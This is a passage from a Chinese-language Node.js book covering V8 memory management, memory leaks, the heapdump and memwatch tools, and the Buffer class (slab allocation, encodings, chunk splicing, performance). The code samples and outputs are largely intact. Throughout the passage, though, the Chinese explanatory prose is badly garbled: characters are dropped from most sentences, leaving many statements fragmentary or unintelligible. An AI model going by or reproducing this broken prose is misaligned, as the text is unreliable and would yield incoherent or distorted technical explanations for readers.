了解了作用，有于我们了解量的分。
3. 
量是量（不过var定在global量上），由于作用要到程才能，时用的对内（在生中）。要内的对，可以过delete作用关系。者量新，的对用关系。在接下的生内的过程中，会收。下为
global.foo = "I am global object"; console.log(global.foo); // => "I am global object" delete global.foo; //者重global.foo = undefined; // or null console.log(global.foo); // => undefined 
样，在作用中，想动量用的对，也可以过这样的。delete作新有相的，是在V8中过delete对的性有可能V8的优，以过解用好。
5.2.2
我们作用上的对问只能上，这样外部内部问。下可以
var foo = function () { var local = "局部量"; (function () { 
 console.log(local); }()); }; 
在下的中，会到local定的
var foo = function () { (function () { 
 var local = "局部量"; }()); console.log(local); 
}; 
在JavaScript中，实外部作用问内部作用中量的做closure。这于高数的性数可以作为数者。的下
var foo = function () { 
var bar = function () {  var local = "局部量";  return function () { 
return local; 
 }; }; var baz = bar(); console.log(baz()); 
}; 
一言，在bar()数后，部量local会着作用的收。是这的在于是一个数，且这个数中了问local的。在后续的中，在外部作用中还是接问local，是要问它，只要过这个中数作可。
包是JavaScript的高性，用它可以产生很多的。它的问题在于，一有量用这个中数，这个中数不会，时也会使始的作用不会到，作用中产生的内用也不会到。不有用，才会。
5.2.3
在的JavaScript中，立收的内有包量用这情。由于V8的内，要分小心量是否加，因为它会生中的对多。
5.3
一言，应用中在一些性的对是的，且在的使用中，量都会自动收。是也会在一些我们认为会收是没有收的对，这会内用。一到V8的内，会到内，程。
5.3.1
前我们到了process.memoryUsage()可以内使用情。之外，os中的totalmem()freemem()也可以内使用情。
1. 
用process.memoryUsage()可以到Node程的内用情，下
$ node 
> process.memoryUsage() 
{ rss: 13852672, 
heapTotal: 6131200, 
heapUsed: 2757120 } 
rss是resident set size的写，程的内部分。程的内有几部分，一部分是rss，余部分在区（swap）者系统（filesystem）中。
了rss外，heapTotalheapUsed对应的是V8的内信。heapTotal是中请的内量，heapUsed目前中使用中的内量。这3个的都是。
为了好，我们一下
var showMem = function () { 
var mem = process.memoryUsage(); 
var format = function (bytes) { 
 return (bytes / 1024 / 1024).toFixed(2) + ' MB'; 
}; 
console.log('Process: heapTotal ' + format(mem.heapTotal) + 
' heapUsed ' + format(mem.heapUsed) + ' rss ' + format(mem.rss)); 
console.log('-----------------------------------------------------------'); 
}; 
时，写一个用于不分内不内，相关下
var useMem = function () { var size = 20 * 1024 * 1024; var arr = new Array(size); for (var i =0; i < size; i++){ 
 arr[i] = 0; } return arr; 
}; 

var total = []; 
for (var j = 0; j < 15;j++) { showMem(); total.push(useMem()); 
} showMem(); 
以上为outofmemory.js并它，到的下 
$ node outofmemory.js Process: heapTotal 3.86 MB heapUsed 2.10 MB rss 11.16 MB 
Process: heapTotal 357.88 MB heapUsed 353.95 MB rss 365.44 MB 
Process: heapTotal 520.88 MB heapUsed 513.94 MB rss 526.30 MB 
Process: heapTotal 679.91 MB heapUsed 673.86 MB rss 686.14 MB 
Process: heapTotal 839.93 MB heapUsed 833.86 MB rss 846.16 MB 
Process: heapTotal 999.94 MB heapUsed 993.86 MB rss 1006.93 MB 
Process: heapTotal 1159.96 MB heapUsed 1153.86 MB rss 1166.95 MB 
Process: heapTotal 1367.99 MB heapUsed 1361.86 MB rss 1375.00 MB 
FATAL ERROR: CALL_AND_RETRY_2 Allocation failed -process out of memory 
可以到，次用useMem都了3个的。在接1500 MB的时候，继续分内，后程内了，环都，仅了7次。
2. 
与process.memoryUsage()不的是，os中的totalmem()freemem()这个用于作系统的内使用情，它们分系统的内内，以为。下
$ node > os.totalmem() 8589934592 > os.freemem() 4527833088 > 
从信可以到我的的内为8 GB，前内大为4.2 GB。
5.3.2
过process.momoryUsage()的可以到，中的内用量是小于程的内用
量，这着Node中的内使用并都是过V8分的。我们些不是过V8分的内
为。这我们前的useMem()一下，Array为Buffer，size大，一次
200 MB的对，相关下
var useMem = function () { var size = 200 * 1024 * 1024; var buffer = new Buffer(size); for (var i =0;i < size; i++){ 
 buffer[i] = 0; } return buffer; 
}; 
新，到的下
$ node out_of_heap.js Process: heapTotal 3.86 MB heapUsed 2.07 MB rss 11.12 MB Process: heapTotal 5.85 MB heapUsed 1.94 MB rss 212.88 MB Process: heapTotal 5.85 MB heapUsed 1.95 MB rss 412.89 MB Process: heapTotal 5.85 MB heapUsed 1.95 MB rss 612.89 MB Process: heapTotal 5.85 MB heapUsed 1.92 MB rss 812.89 MB Process: heapTotal 5.85 MB heapUsed 1.92 MB rss 1012.89 MB Process: heapTotal 5.85 MB heapUsed 1.84 MB rss 1212.91 MB Process: heapTotal 5.85 MB heapUsed 1.84 MB rss 1412.91 MB Process: heapTotal 5.85 MB heapUsed 1.84 MB rss 1612.91 MB Process: heapTotal 5.85 MB heapUsed 1.84 MB rss 1812.91 MB Process: heapTotal 5.85 MB heapUsed 1.84 MB rss 2012.91 MB Process: heapTotal 5.85 MB heapUsed 1.84 MB rss 2212.91 MB Process: heapTotal 5.85 MB heapUsed 1.84 MB rss 2412.91 MB Process: heapTotal 5.85 MB heapUsed 1.85 MB rss 2612.91 MB Process: heapTotal 5.85 MB heapUsed 1.85 MB rss 2812.91 MB Process: heapTotal 5.85 MB heapUsed 1.85 MB rss 3012.91 MB 
我们到15次环都，并且个内用与前一个不。在后的中，heapTotal与heapUsed的极小，一的是rss的，并且已经过V8的。这中的因是Buffer对不于他对，它不经过V8的内分机，以也不会有内的大小。
这着用外内可以内的问题。
为Buffer对并过V8分这在于Node并不于的应用场景。在中，JavaScript接可绝大多数的务，Node要网I/O，作不能的性能。
关于Buffer的可6。
5.3.3
从上的可以，Node的内要由过V8分的部分Node自分的部分。V8的收的要是V8的内。
5.4
Node对内分，一线上应用有上的量，是一个的内也会，收过程中会多时对，应用应，到程内，应用。
在V8的收机下，在的编写中，很会内的情。是内产生于，。管内的情不相，实质只有一个，就是应收的对外没有收，了在生中的对。
，内的因有下几个。
。
不时。
作用。
5.4.1
在应用中的作用，可以分有源。因为它的问要I/O的
高，一中，就可以一次I/O的时。
是在Node中，并。一一个对做使用，就着它会在生中。中的多，活的对也就多，这收在时，对这些对做用。
一个问题在于，JavaScript开发者喜欢用对的对，这与上的有着区，的有着的过，对的对并没有。
下用JavaScript对分创一个对，是收机的，只能小量使用
var cache = {}; var get = function (key) { if (cache[key]) {  return cache[key]; } else {  // get from otherwise 
} }; var set = function (key, value) { 
cache[key] = value; }; 
上在解后，分解，要，只要定对的大小，加上的过以内，还是可以一用的。这一个可能识内的场景memoize。下是underscore对memoize的实
_.memoize = function(func, hasher) { var memo = {}; hasher || (hasher = _.identity); return function() { 
 var key = hasher.apply(this, arguments); return _.has(memo, key) ? memo[key] : (memo[key] = func.apply(this, arguments)); }; }; 
它的是以数作为，以内CPU时。这的是个的都会数在memo对上，不会。这在前端网页这时应用场景中不在大问题，是量大数多样性的情下，会内用不。
以在Node中，试图内的为都应。，这并不是不使用的，是要小心为之。
1. 
为了解决中的对的问题，要加入一的。为我写过一个limitablemap，它可以实对数量的。下是实
var LimitableMap = function (limit) { this.limit = limit || 10; this.map = {}; this.keys = []; 
}; 
var hasOwnProperty = Object.prototype.hasOwnProperty; 
LimitableMap.prototype.set = function (key, value) { var map = this.map; var keys = this.keys; 
if (!hasOwnProperty.call(map, key)) { 
 if (keys.length === this.limit) { var firstKey = keys.shift(); delete map[firstKey]; 
} 
 keys.push(key); } map[key] = value; 
}; 
LimitableMap.prototype.get = function (key) { return this.map[key]; }; 
module.exports = LimitableMap;
可以到，实过程还是的。在数组中，一过数量，就以的淘。
，这淘并不是分高，只能应小应用场景。要高的，可以Isaac Z. Schlueter用LRU的，为https://github.com/isaacs/node-lru-cache。有的，memoize还是可用的。
一个在于机。在2的中，为了加的入，有都会过编，后起。由于过exports的数，可以问中的有量，这样个在编后的作用因为的因，不会。下
(function (exports, require, module, __filename, __dirname) { var local = "局部量"; 
exports.get = function () { return local; }; }); 
由于的机，是生的。在时，要分小心内的。在下的，次用leak()时，都部量leakArray不加内的用，且不
var leakArray = []; exports.leak = function () { leakArray.push("leak" + Math.random()); }; 
不可要这，请加的相应接，以用者内。
2. 
接内作为的要分。了的大小外，外要的事情是，程之享内。在程内使用，这些不可有复，对内的使用是一。
使用大量，目前好的解决是用程外的，程自不。外部的有着好的过淘以自有的内管，不Node程的性能。它的好多多，在Node中要可以解决以下个问题。
(1) 到外部，内的对的数量，收高。
(2) 程之可以享。
目前，上好的有RedisMemcached。Node的生系统分，这个产品的客端都有，过以下可以使用情。
. Redishttps://github.com/mranney/node_redis。 . Memcachedhttps://github.com/3rd-Eden/node-memcached。 
5.4.2
在解决了的内问题后，一个不经产生的内是。在4中可以到，在JavaScript中可以过（数组对）多的，Bagpipe。在者生产者中经中产。这是一个的情，因为在大多数应用场景下，的大于生产的，内不产生。是一于生产，会。
个实的，有的应用会收。，也会用数。会是海量的，数在系统之上，写入于接写入，于是会数写入作的，JavaScript中相关的作用也不会到，内用不会，从内。
到这场景，的解决是用高的技术。在收的中，用写入的会高。要的是，生产因为些因，者因为的系统，内还是可能的。
深的解决应是的，一，应过系统产生并相关人。一个解决是用都应包时机，一在定的时内应，过数时，使用的都可的应时，一个下。
对于Bagpipe言，它了时绝。用时时，用加入到中就开始时，时就接应一个时。用绝时，时，新到的用会接应。这都能有的内问题。
5.5
前了几内的。在Node中，由于V8的内大小的，它对内。在线服务的请量大时，是一个的都会内用过高。这一下到内时的。在已经有多工用于定Node应用的内，下是一些的工。
. v8-profiler由Danny Coates，它可以用于对V8内对CPU分，目已经有3年没有了。
. node-heapdump这是Node心贡献者之一BenNoordhuis编写的，它对V8内，用于事后分。
. node-mtrace由JimbEsser，它使用了GCC的mtrace工分的使用。
. dtrace在Joyent的SmartOS系统上，有的dtrace工用分内。
. node-memwatch自Mozilla的Lloyd Hilaiel贡献的，用WTFPL可发。

由于，这只着过node-heapdumpnode-memwatch内的。
5.5.1node-heapdump 
想要了解node-heapdump对内的，我们要下一包内的，并为server.js
var leakArray = []; var leak = function () { leakArray.push("leak" + Math.random()); }; 
http.createServer(function (req, res) { leak(); res.writeHead(200, {'Content-Type': 'text/plain'}); res.end('Hello World\n'); 
}).listen(1337); 
console.log('Server running at http://127.0.0.1:1337/'); 
在上这中，次问服务程都起leakArray数组中的加，且不到收。我们可以用curl工入http://127.0.0.1:1337/用问。
. node-heapdump node-heapdump，以下可
$ npm install heapdump 
node-heapdump后，在的一加下入
var heapdump = require('heapdump'); 
入node-heapdump后，就可以动服务程，并接客端的请。问多次之后，leakArray中就会大量的。这个时候我们过服务程发SIGUSR2信，node-heapdump一内的。发信的下
$ kill -USR2 <pid> 
这的会在目下以heapdump-<sec>.<usec>.heapsnapshot的。这是
一大的JSON，要过Chrome的开发者工开。
在Chrome的开发者工中中Profiles，后，从的中Load...，开才的，就可以内中的信，图5-10。

图5-10内中的信
在图5-10中可以到有大量的leak在，这些就是一能到收的数。过在开发者工的中内分，我们可以到的数，后这些信到的。
5.5.2node-memwatch 
node-memwatch的用node-heapdump一样，我们要一有内的。这不node-memwatch的过程。个下
var memwatch = require('memwatch'); 
memwatch.on('leak', function (info) { console.log('leak:'); console.log(info); 
}); 
memwatch.on('stats', function (stats) { console.log('stats:') console.log(stats); 
}); var http = require('http'); 
var leakArray = []; var leak = function () { leakArray.push("leak" + Math.random()); }; 
http.createServer(function (req, res) { leak(); res.writeHead(200, {'Content-Type': 'text/plain'}); res.end('Hello World\n'); 
}).listen(1337); 
console.log('Server running at http://127.0.0.1:1337/'); 
1. stats
在程中使用node-memwatch之后，次收时，会触发一次stats事，这个事会内的统信。在对上创的服务程问时，次stats事的数下，中的写在中了
stats: 
{ num_full_gc: 4, //全堆垃圾回收num_inc_gc: 23, //量垃圾回收heap_compactions: 4, // 对生代进行理usage_trend: 0, //使用势estimated_base: 7152944, //基数current_base: 7152944, //当前基数min: 6720776, //小max: 7152944 } // 
在这些数中，num_full_gcnum_inc_gc反应了收的情。
2. leak
经过续5次收后，内没有，这着有内的产生，node-memwatch会发一个leak事。次leak事到的数下
leak: 
{ start: Mon Oct 07 2013 13:46:27 GMT+0800 (CST), end: Mon Oct 07 2013 13:54:40 GMT+0800 (CST), growth: 6222576, reason: 'heap growth over 5 consecutive GCs (8m 13s) -43.33 mb/hr' } 
这个数能5次收的过程中内了多。
3. 
最到的leak事的信只能我们应用中在内，问题产生在还要从V8的内上定。node-memwatch了的能，它能上对的分数量，从内的。
下为一内的，这是过node-memwatch内的
var memwatch = require('memwatch'); var leakArray = []; 
var leak = function () { leakArray.push("leak" + Math.random()); }; 
// Take first snapshot var hd = new memwatch.HeapDiff(); 
for (var i = 0; i < 10000; i++) { leak(); } 
// Take the second snapshot and compute the diff var diff = hd.end(); console.log(JSON.stringify(diff, null, 2)); 
上这，到的下
$ node diff.js { 
"before": {  "nodes": 11719,  "time": "2013-10-07T06:32:07.000Z",  "size_bytes": 1493304,  "size": "1.42 mb" 
}, 
"after": {  "nodes": 31618,  "time": "2013-10-07T06:32:07.000Z",  "size_bytes": 2684864,  "size": "2.56 mb" 
}, 
"change": {  "size_bytes": 1191560,  "size": "1.14 mb",  "freed_nodes": 129,  "allocated_nodes": 20028, "details": [ 
{ "what": "Array", "size_bytes": 323720, "size": "316.13 kb", "+": 15, "-": 65 
}, 
{ "what": "Code", "size_bytes": -10944, "size": "-10.69 kb", "+": 8, "-": 28 
}, 
{ "what": "String", "size_bytes": 879424,
"size": "858.81 kb", "+": 20001, "-": 1 
} ] } } 
在上的中，要关change下的freed_nodesallocated_nodes，它们了的数量分的数量。这由于有内，分的数量多余的数量。在details下可以到的分数量，要问题在下这中
{ "what": "String", "size_bytes": 879424, "size": "858.81 kb", "+": 20001, "-": 1 
} 
在上中，加分分的对数量。可以过上的测到，有大量的没有收。
5.5.3
从本的内我们可以，内的因要过对内分到。node-heapdumpnode-memwatch有，读者可以它们的优势内。
5.6
在Node中，不可还是会在作大的场景。由于Node的内，作大也要小心，好在Node了stream用于大。
stream是Node的生，接用可。stream继自EventEmitter，本的自定事能，时的事。它分可读可写。Node中的大多数都有stream的应用，fs的createReadStream()createWriteStream()可以分用于创的可读可写，process中的stdinstdout分是可读可写的。
由于V8的内，我们过fs.readFile()fs.writeFile()接大的作，用fs.createReadStream() fs.createWriteStream()过的实对大的作。下的了读一个，后数写入到一个的过程
var reader = fs.createReadStream('in.txt'); var writer = fs.createWriteStream('out.txt'); reader.on('data', function (chunk) { 
writer.write(chunk); }); reader.on('end', function () {
writer.end(); }); 
由于读写定，上有的，下
var reader = fs.createReadStream('in.txt'); var writer = fs.createWriteStream('out.txt'); reader.pipe(writer); 
可读了管pipe()，了data事写入作。过的，上不会到V8内的，有高了程序的性。
不要的作，不要V8，可以试的Buffer作，这不会到V8内的。是这大使用内的情要小心，使V8不内的大小，内有。
5.7
NodeJavaScript的要应用场景到了服务端，相应要的也与端不，要为一源作。的，内在Node中不能心使用，也不是不。本了内的，读者可以在使用中，与生系统中的，发Node的。
5.8
在这，我对本的。本的源下
. https://github.com/joyent/node/wiki/FAQ . http://www.cs.sunysb.edu/~cse304/Fall08/Lectures/mem-handout.pdf 
. http://en.wikipedia.org/wiki/Resident_set_size 
. https://github.com/isaacs/node-lru-cache 
. https://github.com/mranney/node_redis . https://github.com/3rd-Eden/node-memcached 
. http://nodejs.org/docs/latest/api/stream.html . http://www.showmuch.com/a/20111012/215033.html 
. https://github.com/lloyd/node-memwatch 
. https://github.com/bnoordhuis/node-heapdump . http://www.williamlong.info/archives/3042.html . https://code.google.com/p/v8/issues/detail?id=847 . http://blog.chromium.org/2011/11/game-changer-for-interactive.html

Buffer  
第章 



JavaScript对于（string）的作分友好，是还是，都认为是一个。下
console.log("0123456789".length); // 10 console.log("".length); //10 console.log("\u00bd".length); // 1 
对PHP中的统，我们要动用外的数的。下
<?php echo strlen("0123456789"); // 10 echo "\n"; echo strlen(""); // 30 echo "\n"; echo mb_strlen("", "utf-8"); //10 echo "\n"; ?> 
与5的内一样，本的也是前端JavaScript开发者不的内。网I/O对于前端开发者言都是不有的应用场景，因为前端只做一些的作DOM作本就能务，在ECMAScript中，也没有对这些做的定，只有CommonJS中有部分的定。由于应用场景不，在Node中，应用要网、作数、图、接收上，在网的作中，还要大量数，JavaScript自有的不能这些，于是Buffer对应生。
6.1Buffer 
Buffer是一个像Array的对，它要用于作。下我们从对的上认识它。
6.1.1
Buffer是一个的JavaScript与C++的，它性能相关部分用C++实，性能相关的部分用JavaScript实，图6-1。

图6-1 Buffer的分工
5了Buffer用的内不是过V8分的，于外内。由于V8收性能的，用的作对用高有的内分收管是个不的。由于Buffer过，Node在程动时就已经加了它，并在对（global）上。以在使用Buffer时，过require()可接使用。
6.1.2Buffer
Buffer对于数组，它的为16的数，0到255的数。下
var str = "入出node.js"; var buf = new Buffer(str, 'utf-8'); console.log(buf); // => <Buffer e6 b7 b1 e5 85 a5 e6 b5 85 e5 87 ba 6e 6f 64 65 2e 6a 73> 
由上的可，不编的用的个数不相，上中的中在UTF-8编下用3个，用1个。BufferArray的很大，可以问length性到，也可以过下问，在对时也分相，下
var buf = new Buffer(100); console.log(buf.length); // => 100 
上分了一个100的Buffer对。可以过下问初始的Buffer的，下
console.log(buf[10]); 
这会到一个的，它的是一个0到255的机。样，我们也可以过下对它
buf[10] = 100; console.log(buf[10]); // => 100 
的是，不是0到255的数是小数时会样下
buf[20] = -100; console.log(buf[20]); // 156 buf[21] = 300; console.log(buf[21]); // 44 buf[22] = 3.1415; console.log(buf[22]); // 3 
的小于0，就次加256，到到一个0到255之的数。到的数大于255，就次256，到到0~255区内的数。是小数，小数部分，只数部分。
6.1.3Buffer
Buffer对的内分不是在V8的内中，是在Node的C++实内的请的。因为大量的数不能用要一内就作系统请一内的，这可能大量的内请的系统用，对作系统有一定。为Node在内的使用上应用的是在C++请内、在JavaScript中分内的。
为了高使用请的内，Node用了slab分机。slab是一动内管机，最生于SunOS作系统（Solaris）中，目前在一些*nix作系统中有广的应用，FreeBSDLinux。
言，slab就是一请好的定大小的内区。slab有下3。
. full分。
. partial部分分。
. empty没有分。我们要一个Buffer对，可以过以下分定大小的Buffer对

new Buffer(size); 
Node以8 KB为区分Buffer是大对还是小对
Buffer.poolSize = 8 * 1024; 
这个8 KB的也就是个slab的大小，在JavaScript，以它作为内的分。
1. Buffer
定Buffer的大小于8 KB，Node会小对的分。Buffer的分过程中要使用一个部量pool作为中对，于分的slab都它。以下是分一个新的slab的作，它会新请的SlowBuffer对它
var pool; 
function allocPool() { 
pool = new SlowBuffer(Buffer.poolSize); 
pool.used = 0; 
} 
图6-2为一个新的slab。

图6-2新的slab
在图6-2中， slab于empty。小Buffer对时的下
new Buffer(1024); 这次会pool对，pool没有创，会创一个新的slab它if (!pool || pool.length -pool.used < this.length) allocPool(); 时前Buffer对的parent性slab，并下是从这个slab的个（offset）
开始使用的，slab对自也使用了多，下
this.parent = pool; this.offset = pool.used; pool.used += this.length; if (pool.used & 7) pool.used = (pool.used + 8) & ~7; 
图6-3为从一个新的slab中初次分一个Buffer对的图。

图6-3从一个新的slab中初次分一个Buffer对
这时候的slab为partial。
次创一个Buffer对时，过程中会这个slab的余是否。，使用余，并新slab的分。下的创了一个新的Buffer对，它会起一次slab分
new Buffer(3000); 
图6-4为次分的图。

图6-4 从slab中次分一个Buffer对
slab余的不，会新的slab，slab中余的会。，一次1的Buffer对，次8192的Buffer对，由于次分时slab中的
6.2Buffer的换141 
不，以创并使用新的slab，一个slab的8 KB会一个1的Buffer对。下的一使用了个slab
new Buffer(1); new Buffer(8192); 
这要的事是，由于一个slab可能分多个Buffer对使用，只有这些小Buffer对在作用并都可以收时，slab的8 KB才会收。管创了1个的Buffer对，是不它，实可能是8 KB的内没有。
2. Buffer
要过8 KB的Buffer对，会接分一个SlowBuffer对作为slab，这个slab会这个大Buffer对。
// Big buffer, just alloc one this.parent = new SlowBuffer(this.length); this.offset = 0; 
这的SlowBuffer是在C++中定的，用buffer可以问到它，是不推荐接作它，是用Buffer。
上到的Buffer对都是JavaScript的，能V8的收收。是内部的parent性的SlowBuffer对自于Node自C++中的定，是C++上的Buffer对，用内不在V8的中。
3. 
言，的内是在Node的C++的，JavaScript只是使用它。小的Buffer作时，用slab的机请事后分，使JavaScript到作系统之不有过多的内请的系统用。对于大的Buffer言，接使用C++的内，的分作。
6.2Buffer 
Buffer对可以与之相。目前的编有下这几。
. ASCII . UTF-8 . UTF-16LE/UCS-2 . Base64 
. Binary 
. Hex 

6.2.1Buffer 
Buffer对要是过数的
new Buffer(str, [encoding]); 
过数的Buffer对，的只能是一编。encoding数不时，认UTF-8编。
一个Buffer对可以不编的的，用write()可以实目的，下
buf.write(string, [offset], [length], [encoding]) 
由于可以不写入内到Buffer对中，并且次写入可以定编，以Buffer对中可以在多编后的内。要小心的是，编用的不，Buffer反时要。
6.2.2Buffer
实Buffer的也分，Buffer对的toString()可以Buffer对为，下
buf.toString([encoding], [start], [end]) 
的是，可以encoding（认为UTF-8）、start、end这3个数实部的。Buffer对由多编写入，就要在部定不的编，才能的编。
6.2.3Buffer
目前的是，Node的Buffer对的编有，只有数的几编可以在Buffer之。为，Buffer了一个isEncoding()数编是否
Buffer.isEncoding(encoding) 
编作为数入上的数，为true，否为false。很的是，在中国用的GBK、GB2312BIG-5编都不在的中。
对于不的编，可以Node生中的。iconviconv-lite个可以多的编，包括Windows125系、ISO-8859系、IBM/DOS页系、Macintosh系、KOI8系，以Latin1、US-ASCII，也编GBKGB2312。
iconv-lite用JavaScript实，iconv过C++用libiconv。前者后者量，编环境接使用。在性能，由于都是用CPU，在V8的高性能下，了C++到JavaScript的次，JavaScript的性能C++实好。
以下为iconv-lite的
var iconv = require('iconv-lite'); 
// Buffer转字符串var str = iconv.decode(buf, 'win1251'); 
6.3Buffer的143 
//字符串转Buffer var buf = iconv.encode("Sample input string", 'win1251'); 
外，iconviconv-lite对的内时的不相。iconv-lite的内是多，会
是，?。iconv有，会试的内，者这些内。不，iconv对于的内会到EILSEQ。下是iconv的
var iconv = new Iconv('UTF-8', 'ASCII'); iconv.convert('.a va'); // throws EILSEQ 
var iconv = new Iconv('UTF-8', 'ASCII//IGNORE'); iconv.convert('.a va'); // returns "a va" 
var iconv = new Iconv('UTF-8', 'ASCII//TRANSLIT'); iconv.convert('.a va'); // "ca va" 
var iconv = new Iconv('UTF-8', 'ASCII//TRANSLIT//IGNORE'); iconv.convert('.a va '); // "ca va " 
6.3Buffer 
Buffer在使用场景中，是以一一的。以下是的从入中读内的
var fs = require('fs'); 
var rs = fs.createReadStream('test.md'); var data = ''; rs.on("data", function (chunk){ 
data += chunk; }); rs.on("end", function () { 
console.log(data); }); 
上这于国外，用于读的，data事中的chunk对是Buffer对。对于初学者言，Buffer做解，以在接上的时不会有。
一入中有编时，问题就会。你在过Node开发的网上到，问题的起源多自于这。这的问题在于下这

data += chunk;
这了toString()作，它于下的
data = data.toString() + chunk.toString(); 
的是，外国人的语境是环境，在他们的场景下，这个toString()不会问题。对于的中，会问题。为了这个问题，下我们的场景，可读的次读的Buffer为11，下
var rs = fs.createReadStream('test.md', {highWaterMark: 11}); 
的测试数为的。程序，会到以下
前......上......
6.3.1
上的中，月、是、、4个没有，之的是3个
。产生这个的因在于可读在读时会个读Buffer。这的始Buffer应为
<Buffer e5ba 8a e589 8d e698 8ee6 9c 88e5 8589 ef bc8c e796 91 e698 afe5 9c b0e4 b88a e9 9c9cefbc9be4b8bee5a4b4e69c9be6988ee69c88 ...> 
由于我们定了Buffer对的为11，因只读要读7次才能的读，是以下几个Buffer对次
<Buffer e5 ba 8a e5 89 8d e6 98 8e e6 9c> <Buffer 88 e5 85 89 ef bc 8c e7 96 91 e6> ... 
上到的buf.toString()认以UTF-8为编，中在UTF-8下3个。以一个Buffer对在时，只能3个，Buffer中下的2个（e6 9c）会以的。个Buffer对的一个也不能，只能。于是一些的问题。
在这个中我们了11这个，是对于的Buffer言，都有可能在的情，只不过Buffer的大的已，问题不可。
6.3.2setEncoding()string_decoder()
在过上的后，也我们了可读还有一个编的setEncoding()，下
readable.setEncoding(encoding)
的作用是data事中的不是一个Buffer对，是编后的。为，我们继续前的程序，加setEncoding()的下
var rs = fs.createReadStream('test.md', { highWaterMark: 11}); 
rs.setEncoding('utf8'); 
新程序，到
前是上
6.3Buffer的145 
这是人开心的，不Buffer大小的了。Node是实这个的
要，编，触发data事的次数相，这着编并读的本。
事实上，在用setEncoding()时，可读对在内部了一个decoder对。次data事都过decoder对Buffer到的解，后用者。是编后，data不收到始的Buffer对。是这解为编后问题解决了，因为在前分中，，是在的问题。
最问题以解决，还是在于decoder的之。decoder对自于string_decoder StringDecoder的实对。它的是，下我们以
var StringDecoder = require('string_decoder').StringDecoder; var decoder = new StringDecoder('utf8'); 
var buf1 = new Buffer([0xE5, 0xBA, 0x8A, 0xE5, 0x89, 0x8D, 0xE6, 0x98, 0x8E, 0xE6, 0x9C]); console.log(decoder.write(buf1)); // =>前
var buf2 = new Buffer([0x88, 0xE5, 0x85, 0x89, 0xEF, 0xBC, 0x8C, 0xE7, 0x96, 0x91, 0xE6]); console.log(decoder.write(buf2)); // => 
我前到的前个Buffer对写入decoder中。的在于月的并没有一样在个部分分开。StringDecoder在到编后，在UTF-8编下是以3个的的，以一次write()时，只前9个的，月的前个在StringDecoder实内部。次write()时，会这2个余后续11个组在一起，次用3的数。于是问题过这中解决了。
string_decoder很，是它也并能，它目前只能UTF-8、Base64UCS-2/UTF-16LE这3编。以，过setEncoding()的不可否认能解决大部分的问题，并不能从本上解决问题。
6.3.3Buffer 
淘setEncoding()后，下的解决只有多个小Buffer对接为一个Buffer对，后过iconv-lite一的这。+=的不，的Buffer接应下的
var chunks = []; 
var size = 0; 
res.on('data', function (chunk) { 
chunks.push(chunk); 
size += chunk.length; 
}); 
res.on('end', function () { 
var buf = Buffer.concat(chunks, size); var str = iconv.decode(buf, 'utf8'); console.log(str); 
}); 
的接是用一个数组接收到的有Buffer并下有的，后用Buffer.concat()生一个并的Buffer对。Buffer.concat()了从小Buffer对大Buffer对的复过程，实分，学习
Buffer.concat = function(list, length) { if (!Array.isArray(list)) { throw new Error('Usage: Buffer.concat(list, [length])'); } 
if (list.length === 0) {  return new Buffer(0); } else if (list.length === 1) {  return list[0]; } 
if (typeof length !== 'number') {  length = 0; for (var i = 0; i < list.length; i++) { 
var buf = list[i]; length += buf.length; } } 
var buffer = new Buffer(length); var pos = 0; for (var i = 0; i < list.length; i++) { 
 var buf = list[i];  buf.copy(buffer, pos);  pos += buf.length; 
} return buffer; }; 
6.4Buffer 
Buffer在I/O网I/O中用广，在网中，它的性能。在应用中，我们会作，一在网中，都要为Buffer，以数。在Web应用中，到Buffer是时时发生的，高到Buffer的，可以很大程高网。
在开Buffer与网的关系之前，我们可以一次性能测试。下的中了一个10 KB大小的。我们过的客端发，下
var http = require('http'); var helloworld = ""; 
for (var i = 0; i < 1024 * 10; i++){ helloworld += "a"; } 
// helloworld = new Buffer(helloworld); 
http.createServer(function (req, res) { res.writeHead(200); res.end(helloworld); 
}).listen(8001); 
我们过ab一次性能测试，发起200个并发客端
ab -c 200 -t 100 http://127.0.0.1:8001/ 
到的测试下
HTML transferred: 512000000 bytes Requests per second: 2527.64 [#/sec] (mean) Time per request: 79.125 [ms] (mean) Time per request: 0.396 [ms] (mean, across all concurrent requests) Transfer rate: 25370.16 [Kbytes/sec] received 
测试的QPS（次数）是2527.64，为25370.16KB。接下我们helloworld = new Buffer(helloworld);前的，使客端的是一个Buffer对，在次应时。次性能测试的下
Total transferred: 513900000 bytes HTML transferred: 512000000 bytes Requests per second: 4843.28 [#/sec] (mean) Time per request: 41.294 [ms] (mean) Time per request: 0.206 [ms] (mean, across all concurrent requests) Transfer rate: 48612.56 [Kbytes/sec] received 
QPS的到4843.28，为48 612.56KB，性能高一。
过内为Buffer对，可以有CPU的复使用，服务源。在Node的Web应用中，可以页中的动内内分，内部分可以过为Buffer的，使性能到。由于自是数，以在不要内的场景下，量只读Buffer，后接，不做外的，。
文
Buffer的使用了与的有性能外，在的读时，有一个highWaterMark对性能的至关要。在fs.createReadStream(path, opts)时，我们可以入一些数，下
{ flags: 'r', encoding: null, fd: null, mode: 0666, highWaterMark: 64 * 1024 
} 
我们还可以startend定读的
{start: 90, end: 99} 
fs.createReadStream()的工作是在内中一Buffer，后在fs.read()读时从中复到Buffer中。一次读时，从这个Buffer中过slice()部分数作为一个小Buffer对，过data事用。Buffer用，新分一个还有余，继续使用。下为分一个新的Buffer对的作
var pool; 
function allocNewPool(poolSize) { pool = new Buffer(poolSize); pool.used = 0; 
} 
在想的下，次读的就是用定的highWaterMark。是有可能读到了，者本就没有定的highWaterMark大，这个定的Buffer对会有部分余，不过好在这的内可以分下次读时使用。pool是内的，只有pool余数量小于128（kMinPoolSpace）时，才会新分一个新的Buffer对。Node源中分
新的Buffer对的下
if (!pool || pool.length -pool.used < kMinPoolSpace) { // discard the old pool pool = null; allocNewPool(this._readableState.highWaterMark); 
} 
这与Buffer的内分，highWaterMark的大小对性能有个的。
. highWaterMark对Buffer内的分使用有一定。
. highWaterMark过小，可能系统用次数过多。读于Buffer分，Buffer于SlowBuffer分，这可以解为个的分。小（小于8 KB），有可能slab能使用。由于fs.createReadStream()内部用fs.read()实，会起对的系统用，对于大
言，highWaterMark的大小决定会触发系统用data事的次数。以下为Node自的测试，在benchmark/fs/read-stream-throughput.js中可以到
function runTest() { assert(fs.statSync(filename).size === filesize); var rs = fs.createReadStream(filename, { 
 highWaterMark: size,  encoding: encoding }); 
rs.on('open', function() {  bench.start(); }); 
var bytes = 0; 
rs.on('data', function(chunk) {  bytes += chunk.length; }); 
rs.on('end', function() {  try { fs.unlinkSync(filename); } catch (e) {}  // MB/sec  bench.end(bytes / (1024 * 1024)); 
}); } 
下为次的
